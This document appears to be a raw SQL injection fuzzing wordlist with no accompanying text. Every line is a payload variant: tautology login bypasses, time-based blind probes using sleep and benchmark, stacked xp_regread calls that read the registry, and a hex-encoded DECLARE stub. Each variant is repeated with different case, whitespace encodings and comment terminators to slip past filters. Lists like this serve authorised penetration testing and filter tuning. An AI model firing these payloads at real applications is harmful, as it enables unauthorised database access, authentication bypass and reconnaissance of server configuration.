+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/.../*
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/... %23
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/... %23
+declare/**/@q/**/nvarchar/**/(200)/**/0x730065006c00650063/**/...-- 
+DECLARE/**/@Q/**/NVARCHAR/**/(200)/**/0X730065006C00650063/**/...-- 
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20...
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20...
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20... -- 
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20... -- 
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20... -- -
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20... -- -
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20... --+
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20... --+
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20... #
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20... #
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20.../*
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20.../*
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20... %23
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20... %23
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20...-- 
+DECLARE%20@Q%20NVARCHAR%20(200)%200X730065006C00650063%20...-- 
+declare+@q+nvarchar+(200)+0x730065006c00650063+...
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+...
+declare+@q+nvarchar+(200)+0x730065006c00650063+... -- 
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+... -- 
+declare+@q+nvarchar+(200)+0x730065006c00650063+... -- -
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+... -- -
+declare+@q+nvarchar+(200)+0x730065006c00650063+... --+
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+... --+
+declare+@q+nvarchar+(200)+0x730065006c00650063+... #
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+... #
+declare+@q+nvarchar+(200)+0x730065006c00650063+.../*
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+.../*
+declare+@q+nvarchar+(200)+0x730065006c00650063+... %23
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+... %23
+declare+@q+nvarchar+(200)+0x730065006c00650063+...-- 
+DECLARE+@Q+NVARCHAR+(200)+0X730065006C00650063+...-- 
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t...
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t...
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t... -- 
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t... -- 
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t... -- -
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t... -- -
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t... --+
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t... --+
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t... #
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t... #
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t.../*
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t.../*
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t... %23
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t... %23
+declare\t@q\tnvarchar\t(200)\t0x730065006c00650063\t...-- 
+DECLARE\t@Q\tNVARCHAR\t(200)\t0X730065006C00650063\t...-- 
+or 0=0 #
+OR 0=0 #
+or 0=0 # -- 
+OR 0=0 # -- 
+or 0=0 # -- -
+OR 0=0 # -- -
+or 0=0 # --+
+OR 0=0 # --+
+or 0=0 # #
+OR 0=0 # #
+or 0=0 #/*
+OR 0=0 #/*
+or 0=0 # %23
+OR 0=0 # %23
+or 0=0 #-- 
+OR 0=0 #-- 
+or/**/0=0/**/#
+OR/**/0=0/**/#
+or/**/0=0/**/# -- 
+OR/**/0=0/**/# -- 
+or/**/0=0/**/# -- -
+OR/**/0=0/**/# -- -
+or/**/0=0/**/# --+
+OR/**/0=0/**/# --+
+or/**/0=0/**/# #
+OR/**/0=0/**/# #
+or/**/0=0/**/#/*
+OR/**/0=0/**/#/*
+or/**/0=0/**/# %23
+OR/**/0=0/**/# %23
+or/**/0=0/**/#-- 
+OR/**/0=0/**/#-- 
+or%200=0%20#
+OR%200=0%20#
+or%200=0%20# -- 
+OR%200=0%20# -- 
+or%200=0%20# -- -
+OR%200=0%20# -- -
+or%200=0%20# --+
+OR%200=0%20# --+
+or%200=0%20# #
+OR%200=0%20# #
+or%200=0%20#/*
+OR%200=0%20#/*
+or%200=0%20# %23
+OR%200=0%20# %23
+or%200=0%20#-- 
+OR%200=0%20#-- 
+or+0=0+#
+OR+0=0+#
+or+0=0+# -- 
+OR+0=0+# -- 
+or+0=0+# -- -
+OR+0=0+# -- -
+or+0=0+# --+
+OR+0=0+# --+
+or+0=0+# #
+OR+0=0+# #
+or+0=0+#/*
+OR+0=0+#/*
+or+0=0+# %23
+OR+0=0+# %23
+or+0=0+#-- 
+OR+0=0+#-- 
+or\t0=0\t#
+OR\t0=0\t#
+or\t0=0\t# -- 
+OR\t0=0\t# -- 
+or\t0=0\t# -- -
+OR\t0=0\t# -- -
+or\t0=0\t# --+
+OR\t0=0\t# --+
+or\t0=0\t# #
+OR\t0=0\t# #
+or\t0=0\t#/*
+OR\t0=0\t#/*
+or\t0=0\t# %23
+OR\t0=0\t# %23
+or\t0=0\t#-- 
+OR\t0=0\t#-- 
+insert
+INSERT
+insert -- 
+INSERT -- 
+insert -- -
+INSERT -- -
+insert --+
+INSERT --+
+insert #
+INSERT #
+insert/*
+INSERT/*
+insert %23
+INSERT %23
+insert-- 
+INSERT-- 
+1) or sleep(5)#
+1) OR SLEEP(5)#
+1) or sleep(5)# -- 
+1) OR SLEEP(5)# -- 
+1) or sleep(5)# -- -
+1) OR SLEEP(5)# -- -
+1) or sleep(5)# --+
+1) OR SLEEP(5)# --+
+1) or sleep(5)# #
+1) OR SLEEP(5)# #
+1) or sleep(5)#/*
+1) OR SLEEP(5)#/*
+1) or sleep(5)# %23
+1) OR SLEEP(5)# %23
+1) or sleep(5)#-- 
+1) OR SLEEP(5)#-- 
+1)/**/or/**/sleep(5)#
+1)/**/OR/**/SLEEP(5)#
+1)/**/or/**/sleep(5)# -- 
+1)/**/OR/**/SLEEP(5)# -- 
+1)/**/or/**/sleep(5)# -- -
+1)/**/OR/**/SLEEP(5)# -- -
+1)/**/or/**/sleep(5)# --+
+1)/**/OR/**/SLEEP(5)# --+
+1)/**/or/**/sleep(5)# #
+1)/**/OR/**/SLEEP(5)# #
+1)/**/or/**/sleep(5)#/*
+1)/**/OR/**/SLEEP(5)#/*
+1)/**/or/**/sleep(5)# %23
+1)/**/OR/**/SLEEP(5)# %23
+1)/**/or/**/sleep(5)#-- 
+1)/**/OR/**/SLEEP(5)#-- 
+1)%20or%20sleep(5)#
+1)%20OR%20SLEEP(5)#
+1)%20or%20sleep(5)# -- 
+1)%20OR%20SLEEP(5)# -- 
+1)%20or%20sleep(5)# -- -
+1)%20OR%20SLEEP(5)# -- -
+1)%20or%20sleep(5)# --+
+1)%20OR%20SLEEP(5)# --+
+1)%20or%20sleep(5)# #
+1)%20OR%20SLEEP(5)# #
+1)%20or%20sleep(5)#/*
+1)%20OR%20SLEEP(5)#/*
+1)%20or%20sleep(5)# %23
+1)%20OR%20SLEEP(5)# %23
+1)%20or%20sleep(5)#-- 
+1)%20OR%20SLEEP(5)#-- 
+1)+or+sleep(5)#
+1)+OR+SLEEP(5)#
+1)+or+sleep(5)# -- 
+1)+OR+SLEEP(5)# -- 
+1)+or+sleep(5)# -- -
+1)+OR+SLEEP(5)# -- -
+1)+or+sleep(5)# --+
+1)+OR+SLEEP(5)# --+
+1)+or+sleep(5)# #
+1)+OR+SLEEP(5)# #
+1)+or+sleep(5)#/*
+1)+OR+SLEEP(5)#/*
+1)+or+sleep(5)# %23
+1)+OR+SLEEP(5)# %23
+1)+or+sleep(5)#-- 
+1)+OR+SLEEP(5)#-- 
+1)\tor\tsleep(5)#
+1)\tOR\tSLEEP(5)#
+1)\tor\tsleep(5)# -- 
+1)\tOR\tSLEEP(5)# -- 
+1)\tor\tsleep(5)# -- -
+1)\tOR\tSLEEP(5)# -- -
+1)\tor\tsleep(5)# --+
+1)\tOR\tSLEEP(5)# --+
+1)\tor\tsleep(5)# #
+1)\tOR\tSLEEP(5)# #
+1)\tor\tsleep(5)#/*
+1)\tOR\tSLEEP(5)#/*
+1)\tor\tsleep(5)# %23
+1)\tOR\tSLEEP(5)# %23
+1)\tor\tsleep(5)#-- 
+1)\tOR\tSLEEP(5)#-- 
+) or ('a'='a
+) OR ('A'='A
+) or ('a'='a -- 
+) OR ('A'='A -- 
+) or ('a'='a -- -
+) OR ('A'='A -- -
+) or ('a'='a --+
+) OR ('A'='A --+
+) or ('a'='a #
+) OR ('A'='A #
+) or ('a'='a/*
+) OR ('A'='A/*
+) or ('a'='a %23
+) OR ('A'='A %23
+) or ('a'='a-- 
+) OR ('A'='A-- 
+)/**/or/**/('a'='a
+)/**/OR/**/('A'='A
+)/**/or/**/('a'='a -- 
+)/**/OR/**/('A'='A -- 
+)/**/or/**/('a'='a -- -
+)/**/OR/**/('A'='A -- -
+)/**/or/**/('a'='a --+
+)/**/OR/**/('A'='A --+
+)/**/or/**/('a'='a #
+)/**/OR/**/('A'='A #
+)/**/or/**/('a'='a/*
+)/**/OR/**/('A'='A/*
+)/**/or/**/('a'='a %23
+)/**/OR/**/('A'='A %23
+)/**/or/**/('a'='a-- 
+)/**/OR/**/('A'='A-- 
+)%20or%20('a'='a
+)%20OR%20('A'='A
+)%20or%20('a'='a -- 
+)%20OR%20('A'='A -- 
+)%20or%20('a'='a -- -
+)%20OR%20('A'='A -- -
+)%20or%20('a'='a --+
+)%20OR%20('A'='A --+
+)%20or%20('a'='a #
+)%20OR%20('A'='A #
+)%20or%20('a'='a/*
+)%20OR%20('A'='A/*
+)%20or%20('a'='a %23
+)%20OR%20('A'='A %23
+)%20or%20('a'='a-- 
+)%20OR%20('A'='A-- 
+)+or+('a'='a
+)+OR+('A'='A
+)+or+('a'='a -- 
+)+OR+('A'='A -- 
+)+or+('a'='a -- -
+)+OR+('A'='A -- -
+)+or+('a'='a --+
+)+OR+('A'='A --+
+)+or+('a'='a #
+)+OR+('A'='A #
+)+or+('a'='a/*
+)+OR+('A'='A/*
+)+or+('a'='a %23
+)+OR+('A'='A %23
+)+or+('a'='a-- 
+)+OR+('A'='A-- 
+)\tor\t('a'='a
+)\tOR\t('A'='A
+)\tor\t('a'='a -- 
+)\tOR\t('A'='A -- 
+)\tor\t('a'='a -- -
+)\tOR\t('A'='A -- -
+)\tor\t('a'='a --+
+)\tOR\t('A'='A --+
+)\tor\t('a'='a #
+)\tOR\t('A'='A #
+)\tor\t('a'='a/*
+)\tOR\t('A'='A/*
+)\tor\t('a'='a %23
+)\tOR\t('A'='A %23
+)\tor\t('a'='a-- 
+)\tOR\t('A'='A-- 
+; exec xp_regread
+; EXEC XP_REGREAD
+; exec xp_regread -- 
+; EXEC XP_REGREAD -- 
+; exec xp_regread -- -
+; EXEC XP_REGREAD -- -
+; exec xp_regread --+
+; EXEC XP_REGREAD --+
+; exec xp_regread #
+; EXEC XP_REGREAD #
+; exec xp_regread/*
+; EXEC XP_REGREAD/*
+; exec xp_regread %23
+; EXEC XP_REGREAD %23
+; exec xp_regread-- 
+; EXEC XP_REGREAD-- 
+;/**/exec/**/xp_regread
+;/**/EXEC/**/XP_REGREAD
+;/**/exec/**/xp_regread -- 
+;/**/EXEC/**/XP_REGREAD -- 
+;/**/exec/**/xp_regread -- -
+;/**/EXEC/**/XP_REGREAD -- -
+;/**/exec/**/xp_regread --+
+;/**/EXEC/**/XP_REGREAD --+
+;/**/exec/**/xp_regread #
+;/**/EXEC/**/XP_REGREAD #
+;/**/exec/**/xp_regread/*
+;/**/EXEC/**/XP_REGREAD/*
+;/**/exec/**/xp_regread %23
+;/**/EXEC/**/XP_REGREAD %23
+;/**/exec/**/xp_regread-- 
+;/**/EXEC/**/XP_REGREAD-- 
+;%20exec%20xp_regread
+;%20EXEC%20XP_REGREAD
+;%20exec%20xp_regread -- 
+;%20EXEC%20XP_REGREAD -- 
+;%20exec%20xp_regread -- -
+;%20EXEC%20XP_REGREAD -- -
+;%20exec%20xp_regread --+
+;%20EXEC%20XP_REGREAD --+
+;%20exec%20xp_regread #
+;%20EXEC%20XP_REGREAD #
+;%20exec%20xp_regread/*
+;%20EXEC%20XP_REGREAD/*
+;%20exec%20xp_regread %23
+;%20EXEC%20XP_REGREAD %23
+;%20exec%20xp_regread-- 
+;%20EXEC%20XP_REGREAD-- 
+;+exec+xp_regread
+;+EXEC+XP_REGREAD
+;+exec+xp_regread -- 
+;+EXEC+XP_REGREAD -- 
+;+exec+xp_regread -- -
+;+EXEC+XP_REGREAD -- -
+;+exec+xp_regread --+
+;+EXEC+XP_REGREAD --+
+;+exec+xp_regread #
+;+EXEC+XP_REGREAD #
+;+exec+xp_regread/*
+;+EXEC+XP_REGREAD/*
+;+exec+xp_regread %23
+;+EXEC+XP_REGREAD %23
+;+exec+xp_regread-- 
+;+EXEC+XP_REGREAD-- 
+;\texec\txp_regread
+;\tEXEC\tXP_REGREAD
+;\texec\txp_regread -- 
+;\tEXEC\tXP_REGREAD -- 
+;\texec\txp_regread -- -
+;\tEXEC\tXP_REGREAD -- -
+;\texec\txp_regread --+
+;\tEXEC\tXP_REGREAD --+
+;\texec\txp_regread #
+;\tEXEC\tXP_REGREAD #
+;\texec\txp_regread/*
+;\tEXEC\tXP_REGREAD/*
+;\texec\txp_regread %23
+;\tEXEC\tXP_REGREAD %23
+;\texec\txp_regread-- 
+;\tEXEC\tXP_REGREAD-- 
+*|
+*| -- 
+*| -- -
+*| --+
+*| #
+*|/*
+*| %23
+*|-- 
+@var select @var as var into temp end --
+@VAR SELECT @VAR AS VAR INTO TEMP END --
+@var select @var as var into temp end -- -- 
+@VAR SELECT @VAR AS VAR INTO TEMP END -- -- 
+@var select @var as var into temp end -- -- -
+@VAR SELECT @VAR AS VAR INTO TEMP END -- -- -
+@var select @var as var into temp end -- --+
+@VAR SELECT @VAR AS VAR INTO TEMP END -- --+
+@var select @var as var into temp end -- #
+@VAR SELECT @VAR AS VAR INTO TEMP END -- #
+@var select @var as var into temp end --/*
+@VAR SELECT @VAR AS VAR INTO TEMP END --/*
+@var select @var as var into temp end -- %23
+@VAR SELECT @VAR AS VAR INTO TEMP END -- %23
+@var select @var as var into temp end ---- 
+@VAR SELECT @VAR AS VAR INTO TEMP END ---- 
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/--
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/--
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/-- -- 
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/-- -- 
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/-- -- -
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/-- -- -
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/-- --+
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/-- --+
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/-- #
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/-- #
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/--/*
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/--/*
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/-- %23
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/-- %23
+@var/**/select/**/@var/**/as/**/var/**/into/**/temp/**/end/**/---- 
+@VAR/**/SELECT/**/@VAR/**/AS/**/VAR/**/INTO/**/TEMP/**/END/**/---- 
+@var%20select%20@var%20as%20var%20into%20temp%20end%20--
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20--
+@var%20select%20@var%20as%20var%20into%20temp%20end%20-- -- 
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20-- -- 
+@var%20select%20@var%20as%20var%20into%20temp%20end%20-- -- -
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20-- -- -
+@var%20select%20@var%20as%20var%20into%20temp%20end%20-- --+
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20-- --+
+@var%20select%20@var%20as%20var%20into%20temp%20end%20-- #
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20-- #
+@var%20select%20@var%20as%20var%20into%20temp%20end%20--/*
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20--/*
+@var%20select%20@var%20as%20var%20into%20temp%20end%20-- %23
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20-- %23
+@var%20select%20@var%20as%20var%20into%20temp%20end%20---- 
+@VAR%20SELECT%20@VAR%20AS%20VAR%20INTO%20TEMP%20END%20---- 
+@var+select+@var+as+var+into+temp+end+--
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+--
+@var+select+@var+as+var+into+temp+end+-- -- 
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+-- -- 
+@var+select+@var+as+var+into+temp+end+-- -- -
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+-- -- -
+@var+select+@var+as+var+into+temp+end+-- --+
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+-- --+
+@var+select+@var+as+var+into+temp+end+-- #
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+-- #
+@var+select+@var+as+var+into+temp+end+--/*
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+--/*
+@var+select+@var+as+var+into+temp+end+-- %23
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+-- %23
+@var+select+@var+as+var+into+temp+end+---- 
+@VAR+SELECT+@VAR+AS+VAR+INTO+TEMP+END+---- 
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t--
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t--
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t-- -- 
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t-- -- 
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t-- -- -
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t-- -- -
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t-- --+
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t-- --+
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t-- #
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t-- #
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t--/*
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t--/*
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t-- %23
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t-- %23
+@var\tselect\t@var\tas\tvar\tinto\ttemp\tend\t---- 
+@VAR\tSELECT\t@VAR\tAS\tVAR\tINTO\tTEMP\tEND\t---- 
+1)) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,md5(1))#
+1)) OR BENCHMARK(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))# -- 
+1)) or benchmark(10000000,md5(1))# -- 
+1)) OR BENCHMARK(10000000,MD5(1))# -- 
+1)) or benchmark(10000000,MD5(1))# -- -
+1)) or benchmark(10000000,md5(1))# -- -
+1)) OR BENCHMARK(10000000,MD5(1))# -- -
+1)) or benchmark(10000000,MD5(1))# --+
+1)) or benchmark(10000000,md5(1))# --+
+1)) OR BENCHMARK(10000000,MD5(1))# --+
+1)) or benchmark(10000000,MD5(1))# #
+1)) or benchmark(10000000,md5(1))# #
+1)) OR BENCHMARK(10000000,MD5(1))# #
+1)) or benchmark(10000000,MD5(1))#/*
+1)) or benchmark(10000000,md5(1))#/*
+1)) OR BENCHMARK(10000000,MD5(1))#/*
+1)) or benchmark(10000000,MD5(1))# %23
+1)) or benchmark(10000000,md5(1))# %23
+1)) OR BENCHMARK(10000000,MD5(1))# %23
+1)) or benchmark(10000000,MD5(1))#-- 
+1)) or benchmark(10000000,md5(1))#-- 
+1)) OR BENCHMARK(10000000,MD5(1))#-- 
+1))/**/or/**/benchmark(10000000,MD5(1))#
+1))/**/or/**/benchmark(10000000,md5(1))#
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))#
+1))/**/or/**/benchmark(10000000,MD5(1))# -- 
+1))/**/or/**/benchmark(10000000,md5(1))# -- 
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))# -- 
+1))/**/or/**/benchmark(10000000,MD5(1))# -- -
+1))/**/or/**/benchmark(10000000,md5(1))# -- -
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))# -- -
+1))/**/or/**/benchmark(10000000,MD5(1))# --+
+1))/**/or/**/benchmark(10000000,md5(1))# --+
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))# --+
+1))/**/or/**/benchmark(10000000,MD5(1))# #
+1))/**/or/**/benchmark(10000000,md5(1))# #
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))# #
+1))/**/or/**/benchmark(10000000,MD5(1))#/*
+1))/**/or/**/benchmark(10000000,md5(1))#/*
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))#/*
+1))/**/or/**/benchmark(10000000,MD5(1))# %23
+1))/**/or/**/benchmark(10000000,md5(1))# %23
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))# %23
+1))/**/or/**/benchmark(10000000,MD5(1))#-- 
+1))/**/or/**/benchmark(10000000,md5(1))#-- 
+1))/**/OR/**/BENCHMARK(10000000,MD5(1))#-- 
+1))%20or%20benchmark(10000000,MD5(1))#
+1))%20or%20benchmark(10000000,md5(1))#
+1))%20OR%20BENCHMARK(10000000,MD5(1))#
+1))%20or%20benchmark(10000000,MD5(1))# -- 
+1))%20or%20benchmark(10000000,md5(1))# -- 
+1))%20OR%20BENCHMARK(10000000,MD5(1))# -- 
+1))%20or%20benchmark(10000000,MD5(1))# -- -
+1))%20or%20benchmark(10000000,md5(1))# -- -
+1))%20OR%20BENCHMARK(10000000,MD5(1))# -- -
+1))%20or%20benchmark(10000000,MD5(1))# --+
+1))%20or%20benchmark(10000000,md5(1))# --+
+1))%20OR%20BENCHMARK(10000000,MD5(1))# --+
+1))%20or%20benchmark(10000000,MD5(1))# #
+1))%20or%20benchmark(10000000,md5(1))# #
+1))%20OR%20BENCHMARK(10000000,MD5(1))# #
+1))%20or%20benchmark(10000000,MD5(1))#/*
+1))%20or%20benchmark(10000000,md5(1))#/*
+1))%20OR%20BENCHMARK(10000000,MD5(1))#/*
+1))%20or%20benchmark(10000000,MD5(1))# %23
+1))%20or%20benchmark(10000000,md5(1))# %23
+1))%20OR%20BENCHMARK(10000000,MD5(1))# %23
+1))%20or%20benchmark(10000000,MD5(1))#-- 
+1))%20or%20benchmark(10000000,md5(1))#-- 
+1))%20OR%20BENCHMARK(10000000,MD5(1))#-- 
+1))+or+benchmark(10000000,MD5(1))#
+1))+or+benchmark(10000000,md5(1))#
+1))+OR+BENCHMARK(10000000,MD5(1))#
+1))+or+benchmark(10000000,MD5(1))# -- 
+1))+or+benchmark(10000000,md5(1))# -- 
+1))+OR+BENCHMARK(10000000,MD5(1))# -- 
+1))+or+benchmark(10000000,MD5(1))# -- -
+1))+or+benchmark(10000000,md5(1))# -- -
+1))+OR+BENCHMARK(10000000,MD5(1))# -- -
+1))+or+benchmark(10000000,MD5(1))# --+
+1))+or+benchmark(10000000,md5(1))# --+
+1))+OR+BENCHMARK(10000000,MD5(1))# --+
+1))+or+benchmark(10000000,MD5(1))# #
+1))+or+benchmark(10000000,md5(1))# #
+1))+OR+BENCHMARK(10000000,MD5(1))# #
+1))+or+benchmark(10000000,MD5(1))#/*
+1))+or+benchmark(10000000,md5(1))#/*
+1))+OR+BENCHMARK(10000000,MD5(1))#/*
+1))+or+benchmark(10000000,MD5(1))# %23
+1))+or+benchmark(10000000,md5(1))# %23
+1))+OR+BENCHMARK(10000000,MD5(1))# %23
+1))+or+benchmark(10000000,MD5(1))#-- 
+1))+or+benchmark(10000000,md5(1))#-- 
+1))+OR+BENCHMARK(10000000,MD5(1))#-- 
+1))\tor\tbenchmark(10000000,MD5(1))#
+1))\tor\tbenchmark(10000000,md5(1))#
+1))\tOR\tBENCHMARK(10000000,MD5(1))#
+1))\tor\tbenchmark(10000000,MD5(1))# -- 
+1))\tor\tbenchmark(10000000,md5(1))# -- 
+1))\tOR\tBENCHMARK(10000000,MD5(1))# -- 
+1))\tor\tbenchmark(10000000,MD5(1))# -- -
+1))\tor\tbenchmark(10000000,md5(1))# -- -
+1))\tOR\tBENCHMARK(10000000,MD5(1))# -- -
+1))\tor\tbenchmark(10000000,MD5(1))# --+
+1))\tor\tbenchmark(10000000,md5(1))# --+
+1))\tOR\tBENCHMARK(10000000,MD5(1))# --+
+1))\tor\tbenchmark(10000000,MD5(1))# #
+1))\tor\tbenchmark(10000000,md5(1))# #
+1))\tOR\tBENCHMARK(10000000,MD5(1))# #
+1))\tor\tbenchmark(10000000,MD5(1))#/*
+1))\tor\tbenchmark(10000000,md5(1))#/*
+1))\tOR\tBENCHMARK(10000000,MD5(1))#/*
+1))\tor\tbenchmark(10000000,MD5(1))# %23
+1))\tor\tbenchmark(10000000,md5(1))# %23
+1))\tOR\tBENCHMARK(10000000,MD5(1))# %23
+1))\tor\tbenchmark(10000000,MD5(1))#-- 
+1))\tor\tbenchmark(10000000,md5(1))#-- 
+1))\tOR\tBENCHMARK(10000000,MD5(1))#-- 
+asc
+ASC
+asc -- 
+ASC -- 
+asc -- -
+ASC -- -
+asc --+
+ASC --+
+asc #
+ASC #
+asc/*
+ASC/*
+asc %23
+ASC %23
+asc-- 
+ASC-- 
+(||6)
+(||6) -- 
+(||6) -- -
+(||6) --+
+(||6) #
+(||6)/*
+(||6) %23
+(||6)-- 
+\"a\"\" or 3=3--\"
+\"A\"\" OR 3=3--\"
+\"a\"\" or 3=3--\" -- 
+\"A\"\" OR 3=3--\" -- 
+\"a\"\" or 3=3--\" -- -
+\"A\"\" OR 3=3--\" -- -
+\"a\"\" or 3=3--\" --+
+\"A\"\" OR 3=3--\" --+
+\"a\"\" or 3=3--\" #
+\"A\"\" OR 3=3--\" #
+\"a\"\" or 3=3--\"/*
+\"A\"\" OR 3=3--\"/*
+\"a\"\" or 3=3--\" %23
+\"A\"\" OR 3=3--\" %23
+\"a\"\" or 3=3--\"-- 
+\"A\"\" OR 3=3--\"-- 
+\"a\"\"/**/or/**/3=3--\"
+\"A\"\"/**/OR/**/3=3--\"
+\"a\"\"/**/or/**/3=3--\" -- 
+\"A\"\"/**/OR/**/3=3--\" -- 
+\"a\"\"/**/or/**/3=3--\" -- -
+\"A\"\"/**/OR/**/3=3--\" -- -
+\"a\"\"/**/or/**/3=3--\" --+
+\"A\"\"/**/OR/**/3=3--\" --+
+\"a\"\"/**/or/**/3=3--\" #
+\"A\"\"/**/OR/**/3=3--\" #
+\"a\"\"/**/or/**/3=3--\"/*
+\"A\"\"/**/OR/**/3=3--\"/*
+\"a\"\"/**/or/**/3=3--\" %23
+\"A\"\"/**/OR/**/3=3--\" %23
+\"a\"\"/**/or/**/3=3--\"-- 
+\"A\"\"/**/OR/**/3=3--\"-- 
+\"a\"\"%20or%203=3--\"
+\"A\"\"%20OR%203=3--\"
+\"a\"\"%20or%203=3--\" -- 
+\"A\"\"%20OR%203=3--\" -- 
+\"a\"\"%20or%203=3--\" -- -
+\"A\"\"%20OR%203=3--\" -- -
+\"a\"\"%20or%203=3--\" --+
+\"A\"\"%20OR%203=3--\" --+
+\"a\"\"%20or%203=3--\" #
+\"A\"\"%20OR%203=3--\" #
+\"a\"\"%20or%203=3--\"/*
+\"A\"\"%20OR%203=3--\"/*
+\"a\"\"%20or%203=3--\" %23
+\"A\"\"%20OR%203=3--\" %23
+\"a\"\"%20or%203=3--\"-- 
+\"A\"\"%20OR%203=3--\"-- 
+\"a\"\"+or+3=3--\"
+\"A\"\"+OR+3=3--\"
+\"a\"\"+or+3=3--\" -- 
+\"A\"\"+OR+3=3--\" -- 
+\"a\"\"+or+3=3--\" -- -
+\"A\"\"+OR+3=3--\" -- -
+\"a\"\"+or+3=3--\" --+
+\"A\"\"+OR+3=3--\" --+
+\"a\"\"+or+3=3--\" #
+\"A\"\"+OR+3=3--\" #
+\"a\"\"+or+3=3--\"/*
+\"A\"\"+OR+3=3--\"/*
